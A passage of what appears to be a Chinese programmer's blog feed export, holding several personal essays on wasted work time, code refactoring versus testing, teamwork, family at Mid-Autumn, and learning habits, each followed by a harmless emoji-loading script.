“时间是如何被浪费掉”的讨论。里面有个观点大概是说，浪费时间最危险的方式不是放纵消遣，而是花时间去“做假事”。因为当我们消遣的时候，至少知道我们在放纵自己，负罪感会让我们很快地结束这种状态。而所谓的“做假事”，是指我们在工作时间做一些非实质性的工作，例如收发邮件——花一整天的时间去处理邮件不是什么难以置信的事情，而且整个过程我们都会心安理得，因为这确实是工作。但如果过后问自己今天做了什么，我想很多人的答案基本上都是什么也没干。</p><p>我每天的工作都充斥着大量的假事。这些假事本已占用了工作时间，还因为不确定的出现时机，把主要工作的时间也掺和了。我的不少朋友都说，正是由于假事太多，导致白天在公司里根本无法静下心来做任何事情。他们宁愿选择在晚上完成主要工作，而在白天做一些次要的工作——或许这恰好也就是众多程序员都是夜猫子的成因，因为晚上没人打扰。</p><p>其实就我个人而论也是如此。我有时周末需要加班，但如非必要（如协同工作），我宁愿把工作带回去家里做。一来节省了来回公司的时间，二来效率确实比在公司高得多，往往要在公司做一天的事情，我在家里可能仅仅只需要短短的几个小时。</p><p>不过公司始终是公司，沟通交流是不可避免的一环，我们无法改变这个大环境，唯有从自身作要求，首先从不频繁地打扰别人做起，希望由此可以慢慢形成一种氛围——借由提供别人安静的工作环境，换取自己安静的工作环境——我要求不高，还我安静的3 - 4小时足矣。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>半杯水</title>
      <link href="/articles/insights/ban-bei-shui/"/>
      <url>/articles/insights/ban-bei-shui/</url>
      
        <content type="html"><![CDATA[<blockquote><p>读 《<a href="https://book.douban.com/subject/6709809/">暗时间</a>》 有感</p></blockquote><h2 id="这应该算是引子"><a href="#这应该算是引子" class="headerlink" title="这应该算是引子"></a>这应该算是引子</h2><p>半杯水 —— 思如杯，技如水，技盈则满，思盈则空。虚而不满，似无物，可容万物。</p><p>有一个辩题为「能力和思维哪个更重要」。我不选边站，「学而不思则惘，思而不学则怠」，物极必反是亘古之理。只是现在社会的竞争过大，很多人为了眼下的生活，都过份追求自身能力的发展，而忽略了不时反思自身的那份态度。</p><p>我之前问过一个海纳百川的朋友：「你什么新技能都去试，也不想想学得多而不精有什么用？」 于是他告诉我，这样才能在短时间内让上司知道自己有什么变化，而且新东西可以显得自己与众不同。</p><p>我想说，其实如果你可以坚持每天不穿衣服去上班，也是可以起到同样效果的…… 同理，我也不认为一味思考人生就会变得很好，当然如果你想成为下一个「深井冰」，那就另当别论了。</p><p>其实辩题不应该是哪个更重要，因为都重要。关键是如何在两者之间寻求平衡，保持半杯水的「状态」 —— 但我更倾向于认为这是种互补的「心态」：不过分依赖能力、也不过分依赖思考，不过分依赖自己、也不过分依赖他人，为身边的一切寻求互补，不卑不亢，聪明地做事。</p><h2 id="分节目录"><a href="#分节目录" class="headerlink" title="分节目录"></a>分节目录</h2><table><thead><tr><th align="left">-</th><th align="left">-</th></tr></thead><tbody><tr><td align="left">●  苦逼程序猿，劳模运维狮</td><td align="left">—— 工作怪圈</td></tr><tr><td align="left">●  你需要K.I.S.S</td><td align="left">—— 跳出怪圈（程序猿篇）</td></tr><tr><td align="left">●  掌控你的资源</td><td align="left">—— 跳出怪圈（运维狮篇）</td></tr><tr><td align="left">●  能力与方法</td><td align="left">—— 正确地使用你的能力</td></tr><tr><td align="left">●  囚徒困境</td><td align="left">—— 别宅了，抱团吧</td></tr><tr><td align="left">●  人的核心竞争力</td><td align="left">—— 技能不是万能</td></tr><tr><td align="left">●  书写是为了更好地思考</td><td align="left">—— 你的思维需要降速</td></tr></tbody></table><h2 id="苦逼程序猿，劳模运维狮"><a href="#苦逼程序猿，劳模运维狮" class="headerlink" title="苦逼程序猿，劳模运维狮"></a>苦逼程序猿，劳模运维狮</h2><p>对程序猿而言，「重构」永远是最大的课题。</p><p>程序猿最困扰的，莫过于总要面对一堆乱七八糟的历史代码 —— 历史代码其本身可能并不混乱，只是经手的人多了，面目全非罢了。从心理上看，一份代码越混乱，对于维护结果抱着「无所谓」的心态越明显。但不负责任的恶性维护，尽头只能是重构，而即使重构了，却也只是新循环的开始。</p><p>而对于运维狮，「自动」应是他们最终所追求的幻想。</p><p>运维狮的工作核心基本无一例外的就是要面对大量的机器、大量的程序副本、不知何时会崩坏的线程，还要时常排查天文数字一样的监控数据，到头来却不知道自己究竟在维护什么。</p><p>即使渴望可以自动化完成这一切，但「羊群效应」却使得大多数运维狮无意识地从众，因为有安全感的，尤其所面对的东西是未知的时候 —— 既然已经有那么多非自动化部署的程序 …… 于是又手动拷贝了一份程序副本。</p><p>我们总是在嘲笑历史上的别人留下一堆麻烦，历史却总是惊人的相似 —— 因为我们在抱怨别人的烂摊子的同时，一边给别人制造烂摊子却不自知。若始终不肯抛弃「自我感觉良好」的心态，所有人都只能苦逼地活在别人制造的圈子里，然后成为别人嘲笑的劳模。这个循环是时候结束了。</p><h2 id="你需要K-I-S-S"><a href="#你需要K-I-S-S" class="headerlink" title="你需要K.I.S.S"></a>你需要K.I.S.S</h2><p>首先要声明的是，不要理会别人的维护质量有多烂，从自身做起，保持良好的心态，负责任地维护每一份代码才是一个程序猿应有的职业素质。</p><p>但是总有一些代码经过历史不断的修补而变得过于复杂，复杂到我们宁愿放弃80%的功能（这并不是确切的划分，只是我深受二八定律影响罢了）去重构一份简洁的代码 —— 当然如果还有保有我们所需要的那些功能就更好了。</p><p>良好的开端比什么都重要。程序猿觉得代码维护困难，根本原因在于程序设计阶段没有做好。所以无论如何，只要你一下定决心要重构，请务必由始至终把K.I.S.S原则铭记在心。K.I.S.S，即「Keep it simple,stupid!」，直译过来就是「保持简单，傻瓜」。确实，把程序复杂化无助于性能和资源的管控，也使得后续的使用和维护更加困难。</p><p>有一条程序猿悖论如是说：「程序猿的工作效率并不会随着资历的增加而有显著提高」。究其原因，年轻的程序猿会耗费大量的工作时间去敲写几万行代码以体现能力；而老程序猿更倾向于在深入思考后再写出几百行代码以体现质量，即使偶尔花了大量时间在写代码上，一般也只是为了这几百行代码找到最优的组合而已。</p><p>这是因为所有老程序猿都明白，华而不实的工作能力，只会使我们的工作变得更加困难。只有简单才是美，为了简单我们不惜付出任何代价。</p><h2 id="掌控你的资源"><a href="#掌控你的资源" class="headerlink" title="掌控你的资源"></a>掌控你的资源</h2><p>相对于程序猿，运维狮没有推翻一切重来的「重构」手段，因此需要的更多是务实的精神，但务实不等同于蛮干，技巧也很重要。一个合格的运维狮应该思考的不是「能做多少」，而是「如何做得最少」。</p><p>如果你觉得维护工作开始变得困难，或者已经很困难，就需要审视自己是否有正确利用身边的资源以提高自身的工作效率和质量。不要奢望「自家的」程序猿什么时候能提供自动化的程序使你的工作变得轻松，关注第三方的运维工具并利用起来才是王道，毕竟现在的社会，什么东西都是「别人家的」更好啊。</p><p>有一条成功的箴言如是说：「要看一个人是否成功，看他晚上8点之后在干什么」。其实也是很浅显的道理，白天谋生、晚上谋事。作为运维狮，虽然少有晚上时间，但闲下来的时候必须学会充实自己。如果你还在迷茫应该学习什么，或者我能够为你指两个方向：</p><ul><li>掌握shell/sed/awk三剑客编程：学会编写定制化的脚本</li><li>掌握自动化部署工具ansible：用程序生成程序、而不是手工复制</li></ul><p>特别一提的是，不少运维狮容易受工作内容所限，生疏于编程语言、甚至不懂编程语言。其实不妨走出自己的圈子，学习一些编程语言，打通前后端，更有利于自身的工作。在维护出现问题的程序的时候，「知道用什么方法解决」和「知道为什么可以这样解决」是两种截然不同的境界。</p><p>这里说一个题外话，我在协助现场维护工作的时候，发现运维狮和用户之间总有争取硬件资源的矛盾。所谓「宁花机器一分，不费程序员一秒」，程序量提高了，用户却迟迟不肯放宽硬件资源，很多时候可能是没有看到有力的「证据」。如果能够做到常态化监控，并把性能数据持续集成健康的报表，对用户透明化，或许争取资源会更容易，这也是一种做事手段。</p><h2 id="能力与方法"><a href="#能力与方法" class="headerlink" title="能力与方法"></a>能力与方法</h2><blockquote><p>「如果你手里有一把锤子，所有东西看上去都像钉子」。  —— 这不是我说的。</p></blockquote><p>往往我们可能花费了大量时间去学习一项技能，而学无所用是所有人最不愿意发生的事情。于是我们就会尝试在各个方面炫耀这项新技能，而不管它是否适用。</p><p>在我学习设计模式之初，就陷入了这种状态，几乎不能自拔。确实，设计模式为我打开了一扇大门，我首次知道原来代码也可以写得如此优美，使得我迫不及待地寻找可以应用它们的项目，哪怕只有一点可以用得上。但牵强附会总是没有好结果的。</p><p>再如我现在所参与的技术框架开发，虽然一些工具组件已经被成功推广起来了，但一些工具组件却依然不为人所知。不是说这些组件没有技术性，究其原因也是适用性问题。所谓的工具是为了提高开发效率才被制造出来的，而很多同事就投诉说，为了使用一个工具必须注意这注意那，还要配置一堆有的没的东西，甚至还可能与业务逻辑不兼容，如此复杂还不如自己实现。于是他们真的选择了抛弃这些工具。</p><p>所以其实正确的做事态度应该是：「如果你想钉一个钉子，所有东西看上去都像是锤子」。</p><p>即我们在处理问题时，优先考虑的是要做什么What，而不是怎么做How。只有先明确目的，才去选择合适的工具，而不是拿着一把工具对所有事情都勉而为之。正确而有效率地做事，谨记以下几点，受用无穷：</p><ul><li>方向比努力更重要：莫要南辕北辙</li><li>流程比修补更重要：无规矩不成方圆</li><li>方法比拼命更重要：事半功倍</li></ul><h2 id="囚徒困境"><a href="#囚徒困境" class="headerlink" title="囚徒困境"></a>囚徒困境</h2><p>在信息时代，「大鱼吃小鱼」已成为过去，如今是「快鱼吃慢鱼」。但如何能够「快」？在软件开发中，如果单凭一个人在闭关修炼技术，无论学习能力多么像海绵，也不可能短时间内海纳百川，又如何能快得起来？其实这也恰好说明你开始需要一个团队了 —— 为了综合实力，取长补短。</p><p>软件开发的本质就是一项团队运动，人与人的因素对结果的影响完全不亚于技术因素。一个项目成功的关键不仅仅是写出漂亮的代码，团队中的所有人朝着同一个目标一起合作也是同样重要的。但团队工作经常遇到的问题，就是沟通问题，我遇到的主要有两种情况：不愿意沟通，或无法正确表达自己想法。</p><p>举一个博弈中的著名栗子，「囚徒困境」。大概是描述这样的一个问题：两个疑犯被隔离审讯，由于证据不足，若两个都抵赖则均判1年，两个都坦白则均判8年，一个坦白一个抵赖则坦白的释放、抵赖判10年。</p><p>从整体利益上考量，最优的方案是两者均抵赖。但由于两个疑犯不知对方所想，在对方可能会抵赖的怀疑下，局限于自身利益进行判断，都会选择坦白，以保证自身利益最大化。</p><p>囚徒困境也是在团队工作中，缺乏沟通或沟通不当的必然结果。所谓的团队任务，就是要每个人承担一块工作，分别完成后再整合。如果都只从自身角度做考量而不顾他人，即使自己工作得非常出色，但最终却无法与他人的工作完成整合，那么也只是在做无用功。</p><p>只有通过不断的沟通、磨合，才可能保证整体的利益最大化，一盘散沙，终难成事。所谓「要学做事，先学做人」，时刻谨记我们都只是半杯水：内修本领、追求极致，固然重要；外联朋志、寻求互补，方是王道 —— 抱团取暖 = 力量大。</p><h2 id="人的核心竞争力"><a href="#人的核心竞争力" class="headerlink" title="人的核心竞争力"></a>人的核心竞争力</h2><p>前面讲述的都是一些现实性的东西，那些确实都是我们用来竞争的实质性资本。但毕竟随着工作的更替，很多东西也就过时了。而不过时的只有思考的方式，或者说只有思考才真正是我们作为人的不可替代的核心竞争力。</p><p>下面这些是我平时或蒐集、或所悟的「箴言」，既然是分享，我就不要脸地「借鉴」过来了。有时这些看似与技能毫无关系的东西，可能恰好就在某个转折点决定了人生，所以都参考着看一下吧：</p><ul><li>万事先修德，养性必制怒。</li><li>广交朋友并为他们做事情。</li><li>多参与社区活动，积极分享，锻炼口才。</li><li>锻炼身体，笑到最后得有一副好身体。</li><li>反思是让人得以改进自己的最重要的思维品质。</li><li>「教」是最好的「学」。</li><li>我们都是半杯水，正是这样人生才有意义，不卑不亢，寻找互补。</li><li>人生就是一场修行，人必自助而天助之。</li><li>读书，尤其是读那些非实用性的书（如心理学等）。</li><li>潜心一到两项业余爱好，参与一些艺术活动。</li><li>不断寻找偷懒的方法，聪明地工作。</li><li>越努力，越幸运。</li><li>与智者交谈，思考，并常做笔记。</li><li>犯错趁早，防微杜渐。</li><li>因上努力，果上求缘。</li></ul><h2 id="书写是为了更好地思考"><a href="#书写是为了更好地思考" class="headerlink" title="书写是为了更好地思考"></a>书写是为了更好地思考</h2><p>最后，这是一个我自身的一个小故事。  —— 一个我成为「作家（虚伪的）」之前的故事。</p><p>以前我们读书的时候，每天的工作就是写。而现在工作了，扪心自问，又还有谁拿起过笔？恐怕都差不多执笔忘字了吧。</p><p>那为什么我们需要书写？</p><p>众所周知，物理上速度的极限是光速。但撇开物理不谈，比光速更快的，则是人的思维 —— 因为光从地球到火星都需要400秒，而人想一下就到了。</p><p>这不是脑筋急转弯，大部分人应该有过这样的经历：在思考一个问题很久却不得果时，都会试着问一下别人的想法。但当我们把问题描述一次给对方的时候，对方还没做出回答，我们就突然「想通」了。</p><p>这是因为，我们在思考问题的时候，往往已经想明白了各个细节要如何解决，但由于思维速度过快、跳跃性太大，在想细节A的时候、忘记了细节B，想B的时候又忘记了A，从而引起「想不透」或「总觉得哪里不对」的假象。</p><p>而通过文字将问题重新描述一次，实际上就是一个将思考「降速」并「梳理」的过程。因此如果一直想不透一个问题，不妨用笔将其写下来，往往问题就迎刃而解了。有时可能还会因此有意外的收获。</p><p>以上。</p><p>所以….</p><p>所以我好像丝毫没有提到那个故事，这是因为我知道你们不会想看的。</p><p>但其实你已经猜到那个故事了 —— </p><p>所以大家都积极地写一点东西去记录自己的点点滴滴吧！</p><p>或许一开始你可能会纠结怎样可以写出令人眼前一亮的东西，但当你意识到这可以让你更好地思考的时候，你就会摒弃这种纠结。当你慢慢习惯怎样用文字去描述你的想法时，所谓「思如泉涌」也不过如是罢了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 重构 </tag>
            
            <tag> 随笔 </tag>
            
            <tag> 暗时间 </tag>
            
            <tag> K.I.S.S </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>别让你的能力成为绊脚石</title>
      <link href="/articles/insights/bie-rang-ni-de-neng-li-cheng-wei-ban-jiao-shi/"/>
      <url>/articles/insights/bie-rang-ni-de-neng-li-cheng-wei-ban-jiao-shi/</url>
      
        <content type="html"><![CDATA[<p>在溺水时拼命抓住的，真的是救命稻草吗？</p><p>能力越强的人，往往对自己的能力越是依赖。但相对地，处理危机的灵活性可能就越弱——尤其在环境发生巨大变化时，这种能力或许就是妨碍自身拓展最大的绊脚石。</p><p>人都是善于习惯的动物：长期沉溺在单一的环境中，虽培养了能力、但同时也习惯了一成不变的感觉。尤其是在自身日益卓越的时候，更易于陶醉于自己的能力，稍有不慎便会让自负的优越感侵蚀全身，甚至于逐渐对其他技能产生淡漠感、对环境变化产生迟钝感。</p><p>俗话说“居安思危”。自身能力越是接近临界点的时候，也就是最容易让人安于现状的时候——擅长的能力难以提升、其他能力又无心拓展，一旦连最基本的危机感都失去，离被淘汰也就不远了。在此节骨眼上，往往是我们选择的分岔口：是追求精益求精、抑或探求一专多长？我不能帮任何人做出选择，但我个人认为，仅满足于一种能力对自身未必有益：在职业生涯中需要的能力是多元化的，因为这有利于我们可以在环境变化时快速反应、调整自身。我们更需要的是能及时抓住机遇，永远不要被一叶障目、成为井底之蛙。</p><p>或许终将有一日，海上刮起大浪，我们都翻船了、溺水了。这不是危言耸听。于是乎，我们为了自救，出于本能地拼命去抓住身边能够抓住的一切——而我们的能力就是我们的一切——但若是我们只有一种能力，那么能抓住的就只有这根稻草。这毫无办法，即使我们深知这根稻草恐怕无法让我们活命。</p><p>当然，并不是能力越多，活命的机会就越大，这两者并无绝对的相关性。我只是说，能力越多，我们能够选择自救的机会就越多——或者会出现浮板、甚至是木船——至少不会是那根弱不禁风的稻草。</p><p>我很清楚，我也只是个溺水的人。</p><p>但我们都将会是溺水的人。不过，我们都不应该只有一根稻草。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我们需要的，是测试而非重构</title>
      <link href="/articles/insights/wo-men-xu-yao-de-shi-ce-shi-er-fei-chong-gou/"/>
      <url>/articles/insights/wo-men-xu-yao-de-shi-ce-shi-er-fei-chong-gou/</url>
      
        <content type="html"><![CDATA[<p>上台一鞠躬。是的，久别两个月我又回来了。</p><p>最近忙着杂七杂八的一堆事，不过基本都是维护老项目代码了。一说起这个亘古不变的老话题，估计许多人都要开始抱怨了吧：没有格式没有篇章的混乱、没有甚至是错误的注释、没有说明文档……“我可写不出这种天才代码”、“实在太难看了，我要重构”之类的话我已经听不少了。</p><p>读代码难，但写代码也不见得很容易。老代码们都有着他们自己的项目背景，经手的人也多，日积月累自然而言就变成了现在的样子了。重构——说是很容易的——先不论我们的能力跟当时开发者相比孰优孰劣，他们会写出这样的代码总有他们的理由，只是经过时间的磨蚀，当时的缘由我们就不得而知了。</p><p>重构不是对付老代码最好的手段。重构首先会遇到最大的问题，就是刚才提到的项目背景，大多数的老代码除了满足基本需求功能，后期还会不断临时加入满足某些用户需求的特殊功能，若对这些不了解就轻易地重构，势必造成代码功能缺失。</p><p>之所以那么多人要重构老代码，因为我们都对它恐惧。而恐惧，则是源于我们对它的不了解。维护老代码时，我们怕破坏它的功能、怕造成程序的不稳定……我们维护自己的代码时，何曾会怕这怕那的？希望对老代码进行重构，不过是因为我们想把它变成自己的东西、方便自己操作而已。可一旦交接给下一个人，没准他又开始喊着要重构我们的代码了吧。</p><p>老代码告诉我们的是它的基本的样貌，不到万不得已，不必通过重构对它进行整容。我们只需要使用测试用例，去矫正它在岁月中留下的伤疤。</p><p>事实上，我们也应该强迫自己持续地给老代码做测试。刚开始这样做，可能会使得进度缓慢，但长期下去，我们就会有足够的测试用例，这除了使得老代码的功能可以更健壮，也使得我们对老代码更有信心，无需再过度担心维护代码时带来的副作用。</p><p>打个比方，举重运动员为了变得更健壮，日积月累地训练，终于使得腿部筋腱开始出现断裂。不过他认为持续的锻炼会使自己最终适应这种痛苦。但正如他每次下蹲都要忍受疼痛一样，没有测试用例的老代码在各种新功能附加的重压之下也开始出现扭曲、变形。后来医生告诉他应该重点做康复锻炼，因为只有在复健后，他的肌肉会变得更结实、能够承担更多重量。同样地，针对老代码的既有功能补充测试用例，可以使得老代码更健壮，当以后交接到别人手上的时候，重构的呼声自然也就会减少了。</p><p>不过有的时候，我们拿到手的老代码是已经有一定的测试用例的了，它们也能运行成功，但是这些测试却对理解老代码毫无帮助——有些测试是为了图方便而建立的，它们之所以能运行成功，是因为这些测试都是在假设代码能够顺利运行的理想情况下建立的——我们不需要这种花瓶式的测试用例。</p><p>其实最理想的情况，就是测试用例可以完全覆盖老代码，但实际上不可能——我们也不需要那样做——字典上单词都是用到时才去查的，测试用例也一样，不然你有看到过谁把字典背下来了吗？</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 重构 </tag>
            
            <tag> 随笔 </tag>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>月缺，梦圆。</title>
      <link href="/articles/insights/yue-que-meng-yuan/"/>
      <url>/articles/insights/yue-que-meng-yuan/</url>
      
        <content type="html"><![CDATA[<p>又是一年中秋时。</p><p>你多久没回家看过父母了？</p><p>……</p><p>一个星期？一个月？抑或，一年？ </p><p>……</p><p>每个孩子从小都有一个愿望：独立。殊不知是狭隘的独立。年少的我们总是向往无拘无束的自由，而这种又总是单纯地诱使我们离开家里。于是选择远一点的地方念书，便成为了最简单的方法。而我，也不例外。</p><p>在我还在读书那会，我不怎么喜欢回家，纯粹只是因为怕麻烦。</p><p>那时候每个节日对我的意义，无非就是一个休息的日子——不管是春节也好，中秋也罢。虽然都会回家一趟看看父母，但总有一种“循例”的感觉在左右。“每逢佳节倍思亲”，那时的我，其实体会不深。</p><p>然后，就毕业了。</p><p>世事往往发生在意料之外、却又意料之中的无能为力。我因为工作来到了广州，可是昔日的同窗好友，却是一个都不在这里。或许只有到了真正举目无亲的时候，那种在语文课本念了几百遍的思乡情怀才真的会油然而生吧。</p><p>我又怎么想到有一天，回家，也会变成一种奢侈。</p><p>父母总是喜欢把我的前途放在首位，每次我打电话回家，跟父母说大概什么时候回去的时候，电话那头总是说：工作要紧，没时间就不用回了。我回家的时候，经常只能待1天、甚至更短，但只要我回去了，他们都会很开心。其实时间长短又何妨，我不过希望可以带回去一份心意，而已。</p><p>或许是成长总会带来一些自负，毕业的时候，我就跟自己说不会再问家里拿1分钱。因为我没有再依赖父母的理由，也没有资格去依赖他们。但是每次在家的时候，父亲总是问我钱够不够花，母亲则总是做一桌子我喜欢的菜。——他们都怕我一个人过得不好。</p><p>其实一个人又有什么所谓好不好的。我隐约觉得，我依赖了父母20年，父母又何尝不是依赖了我20年。只是我突然有一天真的离开了父母，不用他们照顾了，他们少了一份念想，觉得不习惯吧。我现在唯一可以告诉他们的，就是我过得很好，仅此而已。</p><p>我不怕被父母依赖。倒不如说，我希望有能力被父母依赖。早几年前开始，家里的大小事，父亲都会跟我商量。我那时候总跟父亲说：爸，你喜欢就好了，怎么决定我都没意见。有一次我母亲跟我谈到这个，她跟我说：你爸现在谁都不信，最信就是你……。我那天真的觉得，父母真的都已经老了。</p><p>算上大四那年，我出来工作已经一年多了，每次回到窝里，总是空荡荡的，总有种失落感。说真的，我比较怀念上中学的日子，起码每次回家都能看见父母，只悔那时不懂珍惜。</p><p>经常有人问我：你现在工作的地方跟家里那么近，回家不也是很方便吗？是很方便。但是物理上的距离再短，也是距离。影响沟通的距离。这种距离在心里累积起来，会变成难以驱散的孤独感，我不希望父母承受那种孤独感。</p><p>现在虽然父母嘴上不说，但是我知道他们总盼我什么时候能回家，可以见上一面，但又总是怕会烦叨我，没敢叫我回家。这种滋味不好受。所以我现在的愿望，就是可以把父母接到身边，安享晚年。至少，可以让他们少了一份牵挂。“父母在，不远游”，把父母留在家里，是我心头的一根刺。</p><p>之前在网上看过一篇文章：假设父母都能活到100岁，可等到我们工作的时候，他们的人生已经过半了。剩下50年，如果我们每年只回家1次，那也只能再见父母50次而已。我不知道这种日子还能有多长。但我希望在还没有失去的时候，可以好好地珍惜它。</p><p>中秋不过是个传统，我们不应该为了过中秋而过中秋。平时哪怕再忙，也应该常回家看看，好好想想自己的父母、家人。有些恩情，是我们穷尽一辈子都还不了的。</p><p>……</p><p>月有阴晴圆缺。</p><p>但愿人长久，千里共婵娟。</p><p>……</p><p>最后的最后，愿大家中秋阖家团圆，愿天下父母幸福安康。</p><p><img src="./01.png" alt="月亮总是可以把一瞬间的思念，化作永恒…"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>请发展你的惰性</title>
      <link href="/articles/insights/qing-fa-zhan-ni-de-duo-xing/"/>
      <url>/articles/insights/qing-fa-zhan-ni-de-duo-xing/</url>
      
        <content type="html"><![CDATA[<p>你工作的时候就只是工作吗？</p><p>我不一定。我有些时候不会把今天的所有时间都用在为了完成今天的工作任务中。而且我也相信，把全部时间都花费在工作并不代表就能很好地完成工作。</p><p>作为一个程序员，我上班时出现过的状态不外乎是三种，如果以键盘作为计量单位，那就是：不停地敲键盘、偶尔敲键盘、和不敲键盘。状态一基本就是忙于开发任务的时候，状态二一般就是调试代码的时候，而状态三就是在做跟当前工作没有直接关联的事情的时候。</p><p>如果把状态一和状态二视为对忠于工作任务的韧性，那么状态三应该就是我对工作的惰性了。不过于我而言，一和二不外乎都是体力劳动的一种，只能使我做完工作，但三却能帮我做好工作。</p><p>众所周知，程序员是脑力工作者，我们的价值在于如何运用我们的脑细胞。同样都是为工作的需求写代码，一套考虑周全的代码总比为了应付工作而写的代码生命力更持久，其维护难度也更低。其实IT行业发展至今，先辈们积累了无数这方面的知识，并作为可利用的财富流传下来，而我至今所学的也不过是沧海一粟。因此我比较喜欢看一些前人总结的经验心得，作为我忙中偷闲的乐趣，而契机不过是恰好工作有需要、或是偶尔的突发奇想罢了。</p><p>并非我们在开发和调试的过程中学不到东西，只不过这些大部分都只能够作为我们自身的经验被积累下来。要把经验转化为知识，是需要时间去顿悟的。相较之下，直接去累积前人有价值的知识，化为己用更为便捷。于当下确实是花费了一点工时，而且也未必对目前的工作任务起到关键性的作用，但之后总有其发挥价值的时候，这我深有体会。</p><p>当然，我对工作的这种惰性，有一部分是源于我对职业的兴趣，这也是使得我能够保持不疲于工作的心态的原因之一。虽然对当下工作任务而言，这种惰性有点不公，但我觉得对以后的工作、乃至于职业而言却是有好处的。</p><p>惰性是一种慢热型的能力，未必适用于所有人。即使要发展惰性，各人方向或许也有所不同，不过都应该要知道把握尺度，不要影响到相关工作的完成质量，毕竟惰性的发展并不是能够对工作不负责的借口。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>优雅的烂代码</title>
      <link href="/articles/insights/you-ya-de-lan-dai-ma/"/>
      <url>/articles/insights/you-ya-de-lan-dai-ma/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * ┌───┐   ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┐ * │Esc│   │ F1│ F2│ F3│ F4│ │ F5│ F6│ F7│ F8│ │ F9│F10│F11│F12│ │P/S│S L│P/B│  ┌┐    ┌┐    ┌┐ * └───┘   └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┘  └┘    └┘    └┘ * ┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───────┐ ┌───┬───┬───┐ ┌───┬───┬───┬───┐ * │~ `│! 1│@ 2│# 3│$ 4│% 5│^ 6│&amp; 7│* 8│( 9│) 0│_ -│+ =│ BacSp │ │Ins│Hom│PUp│ │N L│ / │ * │ - │ * ├───┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─────┤ ├───┼───┼───┤ ├───┼───┼───┼───┤ * │ Tab │ Q │ W │ E │ R │ T │ Y │ U │ I │ O │ P │{ [│} ]│ | \ │ │Del│End│PDn│ │ 7 │ 8 │ 9 │   │ * ├─────┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴─────┤ └───┴───┴───┘ ├───┼───┼───┤ + │ * │ Caps │ A │ S │ D │ F │ G │ H │ J │ K │ L │: ;│" '│ Enter  │               │ 4 │ 5 │ 6 │   │ * ├──────┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴────────┤     ┌───┐     ├───┼───┼───┼───┤ * │ Shift  │ Z │ X │ C │ V │ B │ N │ M │&lt; ,│> .│? /│  Shift   │     │ ↑ │     │ 1 │ 2 │ 3 │   │ * ├─────┬──┴─┬─┴──┬┴───┴───┴───┴───┴───┴──┬┴───┼───┴┬────┬────┤ ┌───┼───┼───┐ ├───┴───┼───┤ E││ * │ Ctrl│    │Alt │         Space         │ Alt│    │    │Ctrl│ │ ← │ ↓ │ → │ 